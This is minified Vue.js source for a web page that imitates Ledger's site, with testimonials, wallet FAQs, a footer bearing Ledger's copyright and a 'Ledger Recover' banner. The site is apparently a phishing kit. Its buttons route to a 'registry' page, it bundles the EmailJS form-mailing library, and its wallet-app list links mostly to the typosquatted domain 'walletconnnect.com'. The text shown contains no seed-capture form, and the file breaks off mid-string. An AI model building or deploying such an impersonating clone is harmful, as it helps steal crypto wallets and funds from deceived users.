                    quote: "I got hacked in January and lost 1000s worth of NFTs. I felt disgusted, lost, and willing to quit. Until my friend told me he's ordering a Ledger. So, we bought the duo deal. Since then, I've been sleeping."
                }, {
                    avatar: "/images/winny.eth_.jpg",
                    name: "winnyeth",
                    title: "winny.eth",
                    quote: "I use multiple Ledgers. Different colours = different uses.Public Wallet. Never touch long term storage. Day to day fund holdings. A back up just in case."
                }, {
                    avatar: "/images/2160.jpg",
                    name: "rekt2160",
                    title: "2160",
                    quote: "I have 3 Ledgers. Hot Wallet: minting/drawings etc. Main wallet: store most NFTs. Vault wallet: cold storage of crypto."
                }, {
                    avatar: "/images/fanzo.jpg",
                    name: "SocialFanz",
                    title: "Fanzo",
                    quote: "I have 5 Ledger total. My personal NFT bag. 1 for testing. And 1 for each of my 3 daughters."
                }, {
                    avatar: "/images/petrica.jpg",
                    name: "PetricaButusina",
                    title: "Petrica Butusina",
                    quote: "If I could, I would name my Ledger Hagrid. Cause it's the keeper of my keys."
                }, {
                    avatar: "/images/lkmland.jpg",
                    name: "LkmlandCrypto",
                    title: "Lkmland Crypto",
                    quote: "My Ledger is already called 'Stew'. As it is the steward who looks after my crypto & NFTs, so I can sleep at night."
                }, {
                    avatar: "/images/matt.jpg",
                    name: "MattOney93",
                    title: "Matt Oney",
                    quote: "Ledger makes cold storage downright easy. My NFTs land infinitely safer and I don’t have to feel as paranoid about connecting to new smart contracts."
                }]
            }
        },
        setup() {
            return {
                modules: [E2]
            }
        }
    },
    $3 = e => ($p("data-v-6f9ee3ca"), e = e(), Rp(), e),
    R3 = {
        class: "bg-[#f1f1f1] px-5 py-20"
    },
    D3 = $3(() => f("h1", {
        class: "mb-7 text-4xl font-[500]"
    }, "Testimonials", -1)),
    H3 = {
        class: "w-11/12 md:w-[24rem] shadow-lg rounded-xl px-7 py-12 bg-white flex flex-col justify-between"
    },
    V3 = {
        class: "text-sm mb-5 font-[400] leading-8"
    },
    j3 = {
        class: "flex items-center gap-3 justify-start"
    },
    B3 = ["src"],
    F3 = {
        class: "font-[600] text-sm"
    },
    z3 = {
        class: "text-gray-500 text-xs"
    };

function U3(e, t, s, n, i, r) {
    const o = ce("swiper-slide"),
        l = ce("swiper");
    return O(), R("section", R3, [D3, q(l, {
        pagination: !0,
        modules: n.modules,
        class: "mySwiper w-full"
    }, {
        default: Mt(() => [(O(!0), R(he, null, Ke(i.testimonials, a => (O(), Vs(o, {
            key: a.name,
            class: ""
        }, {
            default: Mt(() => [f("div", H3, [f("p", V3, ye(`"${a.quote}"`), 1), f("div", j3, [f("img", {
                src: a.avatar,
                alt: "testimonial",
                class: "w-12 h-12 rounded-full"
            }, null, 8, B3), f("div", null, [f("h1", F3, ye(a.title), 1), f("p", z3, ye(`@${a.name}`), 1)])])])]),
            _: 2
        }, 1024))), 128))]),
        _: 1
    }, 8, ["modules"])])
}
const G3 = Se(O3, [
        ["render", U3],
        ["__scopeId", "data-v-6f9ee3ca"]
    ]),
    W3 = {
        data() {
            return {
                selectedFaq: 0,
                faqs: [{
                    q: "What is a crypto wallet?",
                    a: ["Thinking about buying crypto or NFTs? You’ll need a crypto wallet.", "When you create a wallet, two keys are generated: a private and a public key. The wallet stores your keys and allows you to sign transactions, generate new addresses, initiate transfers, track portfolio balances, manage your crypto, and interact with dApps.", "Crypto wallets come in many forms, from hardware wallets like Ledger to mobile apps that you can download on your phone or tablet."]
                }, {
                    q: "How do crypto wallets work?",
                    a: ["When you buy crypto like Bitcoin and Ethereum, you’re issued with two keys: the public and private keys.", "The public key can be compared to a bank account number that you can share with third parties to receive crypto without worrying that your assets will be compromised.", "The private key signs transactions and allows you to send and receive crypto. It's crucial to keep your private keys secure and secret. If anyone has access to them, they will also have access to any crypto assets associated with those keys.", "A crypto wallet stores your private keys and gives you access to your assets."]
                }, {
                    q: "What are the different types of crypto wallets?",
                    a: ["There are different types of crypto wallets, each with its own benefits and drawbacks.Hot wallets are connected to the internet and usually convenient to use, however, they are also vulnerable to online attacks. Examples include web-based, mobile, and desktop wallets. With cold wallets, your private keys are stored offline and out of reach of online threats. Examples include paper and hardware wallets.", "Wallets can also be categorized as custodial or non-custodial, depending on who holds the private keys. Storing your crypto in a custodial wallet means that a third party controls your private keys and, therefore, your assets. In contrast, a non-custodial wallet allows you to fully own and control your crypto."]
                }, {
                    q: "Why do I need a hardware wallet?",
                    a: ["Hot wallets store private keys on systems connected to the internet, which makes them susceptible to online attacks. Keeping your crypto on an exchange means you have no true ownership or control over it. If the exchange files for bankruptcy or pauses withdrawals, you lose access to your funds.", "Hardware wallets store your private keys offline, giving you full control and enhanced security. Even if you misplace or lose your hardware wallet, you can get a new one and use your Secret Recovery Phrase to access your assets."]
                }, {
                    q: "How to get a crypto wallet?",
                    a: ["Ready to get started? Here are the steps for getting your crypto wallet:", "Get a Ledger hardware wallet. It stores your private keys in a secure, offline environment giving you peace of mind and complete control over your assets. All Ledger wallets are powered by an industry-leading Secure Element chip, together with Ledger's proprietary OS that protects your crypto & NFTs from sophisticated hacks.", "Pair your Ledger wallet with the Ledger Live app to easily send, receive and grow crypto, keep track of your portfolio, and securely access a range of dApps and Web3 services. All in one place.", "Add crypto to your Ledger wallet. Ledger has partnered with leading third-party providers so that you can securely buy, swap, and grow your crypto through the Ledger Live app. Your crypto will be sent to the safety of your Ledger hardware wallet."]
                }]
            }
        },
        methods: {
            toggleFaq(e) {
                this.selectedFaq === e ? this.selectedFaq = null : this.selectedFaq = e
            }
        }
    },
    q3 = {
        class: "leading-relaxed max-w-screen-xl mt-12 mx-auto px-4 md:px-8"
    },
    K3 = f("div", {
        class: "space-y-3 lg:hidden"
    }, [f("h1", {
        class: "text-3xl font-semibold font-halpha mb-5"
    }, "FAQ"), f("p", {
        class: "max-w-lg mx-auto text-sm"
    }, " Find answers to some of the most common questions. ")], -1),
    Z3 = {
        class: "mt-14 max-w-2xl"
    },
    X3 = ["aria-expanded"],
    Y3 = ["onClick"],
    Q3 = f("i", {
        class: "ri-arrow-right-s-line"
    }, null, -1),
    J3 = [Q3],
    em = {
        class: "font-[500] text-xl mb-5"
    },
    tm = {
        class: "faq-ans"
    };

function sm(e, t, s, n, i, r) {
    return O(), R("div", null, [f("section", q3, [K3, f("div", Z3, [(O(!0), R(he, null, Ke(i.faqs, (o, l) => (O(), R("div", {
        key: l,
        class: "mt-5 overflow-hidden flex items-start faq gap-3",
        "aria-expanded": i.selectedFaq === l
    }, [f("button", {
        class: "faq-btn relative bottom-2",
        onClick: a => r.toggleFaq(l)
    }, J3, 8, Y3), f("div", null, [f("h4", em, ye(o.q), 1), f("div", tm, [f("div", null, [(O(!0), R(he, null, Ke(o.a, (a, c) => (O(), R("p", {
        key: c,
        class: "text-sm mb-5"
    }, ye(a), 1))), 128))])])])], 8, X3))), 128))])])])
}
const nm = Se(W3, [
        ["render", sm]
    ]),
    im = "/images/staking-faq.webp",
    rm = {
        components: {
            FAQs: nm
        }
    },
    om = {
        class: "bg-[#f1f1f1] py-10"
    },
    am = {
        class: "flex container mx-auto justify-between"
    },
    lm = vt('<div class="hidden lg:block"><div class="space-y-3"><h1 class="text-3xl font-semibold font-halpha mb-5">FAQ</h1><p class="max-w-lg text-sm"> Find answers to some of the most common questions. </p></div><div class="p-32"><img src="' + im + '" alt="staking-img"></div></div>', 1);

function cm(e, t, s, n, i, r) {
    const o = ce("FAQs");
    return O(), R("section", om, [f("div", am, [lm, f("div", null, [q(o)])])])
}
const dm = Se(rm, [
        ["render", cm]
    ]),
    fm = {
        data() {
            return {
                icons: ["reddit-fill", "facebook-circle-fill", "instagram-line", "twitter-fill", "youtube-fill", "linkedin-box-fill", "tiktok-fill", "discord-fill"]
            }
        }
    },
    pm = {
        class: "items-center py-12 px-4 gap-4 md:flex xl:px-8 xl:gap-12 bg-[rgb(212,160,255)]"
    },
    um = {
        class: "max-w-screen-xl mx-auto lg:flex justify-between"
    },
    hm = {
        class: "lg:w-1/2"
    },
    gm = f("div", {
        class: "flex-1 space-y-4 mb-5"
    }, [f("h1", {
        class: "font-[500] lg:text-3xl"
    }, "Stay in touch"), f("p", {
        class: "leading-relaxed text-sm"
    }, " Announcements can be found in our blog. Press contact: media@ledger.com ")], -1),
    mm = {
        class: "flex flex-wrap gap-3 mb-16"
    },
    vm = {
        class: "space-y-4 mb-5 lg:w-1/2"
    },
    ym = f("div", {
        class: ""
    }, [f("h1", {
        class: "font-[500] lg:text-3xl"
    }, "Subscribe to our newsletter"), f("p", {
        class: "leading-relaxed text-sm"
    }, " New coins supported, blog updates and exclusive offers directly in your inbox ")], -1),
    bm = {
        class: "mt-5 flex-1"
    },
    wm = {
        class: "mb-5"
    },
    xm = {
        class: "lg:flex items-center justify-start gap-10"
    },
    _m = f("input", {
        type: "email",
        placeholder: "Enter your email",
        class: "lg:w-2/5 text-black placeholder:text-black w-full text-sm px-5 py-5 rounded-full border-2 border-black bg-transparent mb-3"
    }, null, -1),
    Cm = f("i", {
        class: "ri-arrow-right-line text-base"
    }, null, -1),
    Sm = f("p", {
        class: "leading-relaxed text-sm"
    }, [gt(" Your email address will only be used to send you our newsletter, as well as updates and offers. You can unsubscribe at any time using the link included in the newsletter. "), f("br"), f("a", {
        href: "#",
        class: "leading-relaxed text-sm underline"
    }, "Learn more about how we manage your data and your rights")], -1);

function Em(e, t, s, n, i, r) {
    return O(), R("section", pm, [f("div", um, [f("div", hm, [gm, f("div", mm, [(O(!0), R(he, null, Ke(i.icons, o => (O(), R("div", {
        key: o,
        class: "bg-black text-white w-12 h-12 flex items-center justify-center rounded-full"
    }, [f("i", {
        class: Te(`ri-${o}`)
    }, null, 2)]))), 128))])]), f("div", vm, [ym, f("div", bm, [f("form", wm, [f("div", xm, [_m, f("button", {
        onClick: t[0] || (t[0] = o => e.goregistry()),
        class: "flex text-white placeholder:text-black text-base px-5 py-4 rounded-full border-2 border-black bg-black gap-2 items-center mb-5 lg:w-"
    }, [gt(" Register to newsletter "), Cm])]), Sm])])])])])
}
const Bo = Se(fm, [
        ["render", Em]
    ]),
    Tm = {
        props: ["links", "heading", "iD", "is"],
        data: () => ({
            active: !1
        }),
        methods: {
            setActive() {
                return this.$emit("setact", this.iD), this.iD === this.is ? (this.active = !0, this.active) : (this.active = !1, this.active)
            }
        },
        computed: {
            newActive() {
                return this.iD === this.is
            }
        }
    },
    Am = {
        class: "pb-5 md:px-7"
    },
    Lm = {
        class: "flex justify-between items-center"
    },
    Im = {
        class: "font-semibold md:font-bold md:my-5 text-sm"
    },
    Nm = ["data-visible"],
    Pm = f("i", {
        class: "bx bx-chevron-down"
    }, null, -1),
    Mm = [Pm],
    km = ["aria-expanded"],
    Om = {
        class: "text-xs mb-5 text-gray-500"
    };

function $m(e, t, s, n, i, r) {
    return O(), R("div", Am, [f("div", Lm, [f("h5", Im, ye(s.heading), 1), f("button", {
        class: "md:hidden",
        onClick: t[0] || (t[0] = (...o) => r.setActive && r.setActive(...o)),
        "data-visible": e.active
    }, Mm, 8, Nm)]), f("div", {
        class: "bottomNavContent",
        "aria-expanded": r.newActive
    }, [(O(!0), R(he, null, Ke(s.links, o => (O(), R("a", {
        key: o,
        href: "/jobs"
    }, [f("p", Om, ye(o), 1)]))), 128))], 8, km)])
}
const Rm = Se(Tm, [
        ["render", $m]
    ]),
    Dm = "/images/ledger-logo-long.svg",
    Hm = {
        name: "BottomNav",
        components: {
            BottomNavColumn: Rm
        },
        data: () => ({
            active: 0,
            bottomNav1: ["Ledger Stax", "Ledger Nano X", "Ledger Nano S Plus", "Ledger Nano S Plus", "Bundles", "Accessories", "All products", "Downloads"],
            bottomNav2: ["Bitcoin wallet", "Ethereum wallet", "Cardano wallet", "XRP wallet", "Monero wallet", "USDT wallet", "See all assets"],
            bottomNav3: ["Crypto Prices", "Buy crypto", "Staking crypto", "Swap crypto"],
            bottomNav4: ["Ledger Enterprise Solutions"],
            bottomNav5: ["Funding from Ledger Cathay Capital"],
            bottomNav6: ["The Developer Portal"],
            bottomNav7: ["Start using your Ledger device", "Compatible wallets and services", "How to buy Bitcoin", "Guide before buying bitcoin"],
            bottomNav8: ["Support", "Bounty program", "Resellers", "Ledger Press Kit", "Affiliates", "Status", "Partners"],
            bottomNav9: ["Join us", "All jobs"],
            bottomNav10: ["Our vision", "Ledger Academy", "The company", "The people", "Diversity", "Blog"],
            bottomNav11: ["Sales Terms and Conditions", "Website Terms of Use", "Ledger Live Terms of Use", "Privacy Policy", "Cookie Policy", "Other"],
            paymentIcons: ["/images/logo-paypal-s5e1f.png", "/images/logo-crypto-s1bce.png", "/images/logo-bitpay-s1bce.png", "/images/logo-mastercard-s5e1f.png", "/images/logo-visa-s5e1f.png", "/images/logo-maestro-s5e1f.png", "/images/logo-maestro-s5e1f.png"]
        }),
        methods: {
            logger(e) {
                this.active === e ? this.active = 0 : this.active = e
            }
        }
    },
    Vm = {
        class: "bg-black text-white pt-7"
    },
    jm = {
        class: "px-5 py-10 md:flex md:container mx-auto w-full md:gap-5 lg:gap-20"
    },
    Bm = {
        class: "mb-20 md:w-1/5"
    },
    Fm = f("div", {
        class: "w-32 mb-16"
    }, [f("img", {
        src: Dm,
        alt: ""
    })], -1),
    zm = f("p", {
        class: "text-sm text-gray-500 mb-5"
    }, " Copyright © Ledger SAS. All rights reserved. Ledger, Ledger Stax, Ledger Nano S, Ledger Vault, Bolos are registered trademarks of Ledger SAS ", -1),
    Um = f("p", {
        class: "text-sm text-gray-500 mb-5"
    }, " 1 rue du Mail, 75002 Paris, France ", -1),
    Gm = f("h4", {
        class: "text-sm font-[400] text-gray-500 mb-3"
    }, "Payment methods", -1),
    Wm = {
        class: "flex w-44 flex-wrap gap-2"
    },
    qm = ["src"],
    Km = {
        class: "md:w-4/5 md:grid md:grid-cols-3 gap-10"
    },
    Zm = {
        class: ""
    },
    Xm = {
        class: ""
    },
    Ym = {
        class: ""
    };

function Qm(e, t, s, n, i, r) {
    const o = ce("BottomNavColumn");
    return O(), R("section", Vm, [f("div", jm, [f("div", Bm, [Fm, zm, Um, f("div", null, [Gm, f("div", Wm, [(O(!0), R(he, null, Ke(e.paymentIcons, (l, a) => (O(), R("img", {
        key: a,
        src: l,
        alt: "pay-img",
        class: "text-xs"
    }, null, 8, qm))), 128))])])]), f("div", Km, [f("div", Zm, [q(o, {
        heading: "Services & Solutions",
        links: e.bottomNav1,
        iD: 1,
        is: e.active,
        onSetact: r.logger
    }, null, 8, ["links", "is", "onSetact"]), q(o, {
        heading: "Products",
        links: e.bottomNav2,
        iD: 2,
        is: e.active,
        onSetact: r.logger
    }, null, 8, ["links", "is", "onSetact"]), q(o, {
        heading: "Crypto Assets",
        links: e.bottomNav3,
        iD: 3,
        is: e.active,
        onSetact: r.logger
    }, null, 8, ["links", "is", "onSetact"])]), f("div", Xm, [q(o, {
        heading: "Crypto Services",
        links: e.bottomNav4,
        iD: 4,
        is: e.active,
        onSetact: r.logger
    }, null, 8, ["links", "is", "onSetact"]), q(o, {
        heading: "For Business",
        links: e.bottomNav5,
        iD: 5,
        is: e.active,
        onSetact: r.logger
    }, null, 8, ["links", "is", "onSetact"]), q(o, {
        heading: "For Startups",
        links: e.bottomNav6,
        iD: 6,
        is: e.active,
        onSetact: r.logger
    }, null, 8, ["links", "is", "onSetact"]), q(o, {
        heading: "For Developers",
        links: e.bottomNav7,
        iD: 7,
        is: e.active,
        onSetact: r.logger
    }, null, 8, ["links", "is", "onSetact"])]), f("div", Ym, [q(o, {
        heading: "Get started",
        links: e.bottomNav8,
        iD: 8,
        is: e.active,
        onSetact: r.logger
    }, null, 8, ["links", "is", "onSetact"]), q(o, {
        heading: "See also",
        links: e.bottomNav9,
        iD: 9,
        is: e.active,
        onSetact: r.logger
    }, null, 8, ["links", "is", "onSetact"]), q(o, {
        heading: "Careers",
        links: e.bottomNav10,
        iD: 10,
        is: e.active,
        onSetact: r.logger
    }, null, 8, ["links", "is", "onSetact"])])])])])
}
const Fo = Se(Hm, [
        ["render", Qm]
    ]),
    Jm = {
        name: "my_banner",
        methods: {
            goregistry() {
                this.$router.push("registry")
            }
        }
    },
    e6 = {
        class: "bg-white top-0 z-50"
    },
    t6 = {
        class: "flex justify-between md:pl-12 items-center"
    },
    s6 = f("div", {
        class: "flex"
    }, [f("p", {
        class: "px-2 font-[500] text-[0.8rem] leading-[1rem] font-halpha tracking-tight md:leading-[2.3rem] md:text-[1.53rem] uppercase xl:text-2xl"
    }, " New: Enjoy wallet recovery made easy with Ledger Recover, provided by Coincover ")], -1),
    n6 = f("span", {
        class: "hidden lg:inline text-sm lg:w-24 lg:text-left lg:font-semibold"
    }, " Get started ", -1),
    i6 = f("i", {
        class: "ri-arrow-right-line"
    }, null, -1),
    r6 = [n6, i6];

function o6(e, t, s, n, i, r) {
    return O(), R("div", e6, [f("div", t6, [s6, f("a", {
        href: "javascript:void(0)",
        onClick: t[0] || (t[0] = o => r.goregistry()),
        class: "text-center text-white font-medium bg-lg-orange py-3 px-8 flex orange-btn items-center md:px-16 md:py-7 lg:pl-5 lg:w-3/5 lg:pr-0 xl:w-1/5"
    }, r6)])])
}
const a6 = Se(Jm, [
        ["render", o6]
    ]),
    l6 = {
        data() {
            return {
                isSticking: !0
            }
        },
        methods: {
            setStick() {
                this.isSticking = !this.isSticking
            }
        },
        components: {
            NavBar: Ro,
            Hero: Jh,
            BuySection: tg,
            LedgerSection: Rg,
            LedgerCTA: Gg,
            CtaSection: i3,
            LearnMoreSlider: k3,
            Testimonials: G3,
            FAQsSection: dm,
            NewsLetterSection: Bo,
            BottomNav: Fo,
            Banner: a6
        },
        mounted() {
            new IntersectionObserver(t => {
                t.forEach(s => {
                    this.$refs.myNav.classList.toggle("sticking", !s.isIntersecting), this.setStick()
                })
            }).observe(this.$refs.scrollWatcher, this.$refs.white)
        }
    },
    c6 = {
        class: "bg-lg-bg"
    },
    d6 = {
        class: "",
        ref: "scrollWatcher",
        "data-scroll-watcher": ""
    },
    f6 = ["data-visible"],
    p6 = {
        ref: "white"
    },
    u6 = {
        class: "bg-white px-5 py-20 lg:p-24"
    };

function h6(e, t, s, n, i, r) {
    const o = ce("Banner"),
        l = ce("NavBar"),
        a = ce("Hero"),
        c = ce("BuySection"),
        d = ce("LedgerSection"),
        p = ce("LedgerCTA"),
        u = ce("CtaSection"),
        g = ce("LearnMoreSlider"),
        w = ce("Testimonials"),
        b = ce("FAQsSection"),
        S = ce("NewsLetterSection"),
        x = ce("BottomNav");
    return O(), R("div", c6, [f("div", d6, null, 512), q(o), f("div", {
        ref: "myNav",
        class: "sticker",
        "data-visible": i.isSticking
    }, [q(l, {
        dark: i.isSticking
    }, null, 8, ["dark"])], 8, f6), q(a), f("div", p6, [q(c)], 512), q(d), q(p), q(u), f("section", u6, [q(g)]), q(w), q(b), q(S), q(x)])
}
const g6 = Se(l6, [
        ["render", h6]
    ]),
    un = {
        _origin: "https://api.emailjs.com"
    },
    zo = (e, t = "https://api.emailjs.com") => {
        un._userID = e, un._origin = t
    },
    Sd = (e, t, s) => {
        if (!e) throw "The user ID is required. Visit https://dashboard.emailjs.com/admin/integration";
        if (!t) throw "The service ID is required. Visit https://dashboard.emailjs.com/admin";
        if (!s) throw "The template ID is required. Visit https://dashboard.emailjs.com/admin/templates";
        return !0
    };
class Sl {
    constructor(t) {
        this.status = t.status, this.text = t.responseText
    }
}
const Ed = (e, t, s = {}) => new Promise((n, i) => {
        const r = new XMLHttpRequest;
        r.addEventListener("load", ({
            target: o
        }) => {
            const l = new Sl(o);
            l.status === 200 || l.text === "OK" ? n(l) : i(l)
        }), r.addEventListener("error", ({
            target: o
        }) => {
            i(new Sl(o))
        }), r.open("POST", un._origin + e, !0), Object.keys(s).forEach(o => {
            r.setRequestHeader(o, s[o])
        }), r.send(t)
    }),
    m6 = (e, t, s, n) => {
        const i = n || un._userID;
        return Sd(i, e, t), Ed("/api/v1.0/email/send", JSON.stringify({
            lib_version: "3.2.0",
            user_id: i,
            service_id: e,
            template_id: t,
            template_params: s
        }), {
            "Content-type": "application/json"
        })
    },
    v6 = e => {
        let t;
        if (typeof e == "string" ? t = document.querySelector(e) : t = e, !t || t.nodeName !== "FORM") throw "The 3rd parameter is expected to be the HTML form element or the style selector of form";
        return t
    },
    y6 = (e, t, s, n) => {
        const i = n || un._userID,
            r = v6(s);
        Sd(i, e, t);
        const o = new FormData(r);
        return o.append("lib_version", "3.2.0"), o.append("service_id", e), o.append("template_id", t), o.append("user_id", i), Ed("/api/v1.0/email/send-form", o)
    },
    Td = {
        init: zo,
        send: m6,
        sendForm: y6
    },
    Hi = [{
        src: "https://play-lh.googleusercontent.com/RSz4cnzajV5t-j6kEMH1mmwG6RtzsbZCex2NLw6uqTdPC04rMyll0iwt5Ue0ree6-gM",
        appName: "wallet Connect",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
        appName: "Trust Wallet",
        type: "Wallet",
        href: "https://trustwallet.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
        appName: "MetaMask",
        type: "Wallet",
        href: "https://metamask.io/"
    }, {
        src: "https://play-lh.googleusercontent.com/wrgUujbq5kbn4Wd4tzyhQnxOXkjiGqq39N4zBvCHmxpIiKcZw_Pb065KTWWlnoejsg",
        appName: "Coinbase wallet",
        type: "Wallet",
        href: "https://metamask.io/"
    }, {
        src: "https://play-lh.googleusercontent.com/2dEx8K8AnAa8L0xvwKDBQXA--DdTsCqxEJmNvG49KyO5x4YSgQFbZPGANdYYITHtIro",
        appName: "Electrum",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "https://play-lh.googleusercontent.com/d0y_tc6f3BRdVodzpcqoXYQSndvlMoXXqHAwHmDvzwghRvQO8WGSM1I8_lHK_OUNVQ",
        appName: "Exodus",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "https://play-lh.googleusercontent.com/yFBkqYSxBhWgBzTFrX1ynohOZ4VtRwu3f_IHHKkjJt8gHz0OQAw5-XkNH3eGaan9snar",
        appName: "Coinomi",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "https://play-lh.googleusercontent.com/t8vnANR3Ofzoe1rgCTV5McOtbnXLxt7uTKa7nM9uVxthfeXzOEkLiyf6Mbwo6bf1Gjs",
        appName: "Atomic",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "https://play-lh.googleusercontent.com/UiUoRVY5QVI5DAZyP5s6xanuPRrd8HNbKGpjKt3HVPVuT6VJcnXVqR7V4ICQ9rYRCg",
        appName: "Xverse",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "https://play-lh.googleusercontent.com/UlhGKCVtUuXjDDF_fFdDQaF7mdUpMpsKvfQNNQHuwzbNEvvN-sYRNLk308wpWmLQkR4",
        appName: "Yoroi",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "https://play-lh.googleusercontent.com/SKXXUqR4jXkvPJvKSXhJkQjKUU9wA-hI9lgBTrpxEz5GP8NbaOeSaEp1zzQscv8BTA=w240-h480-rw",
        appName: "Keplr",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "https://avatars.githubusercontent.com/u/4146447?s=280&v=4",
        appName: "Trezor",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "https://play-lh.googleusercontent.com/2CCW2NoQkqPR6ZCljV3SxGf-NrEIiUzpdVrpvyw1CXIfq_ZGVEt7bZJPGLLMjxIW5HM",
        appName: "Helium",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "data:image/png;base64,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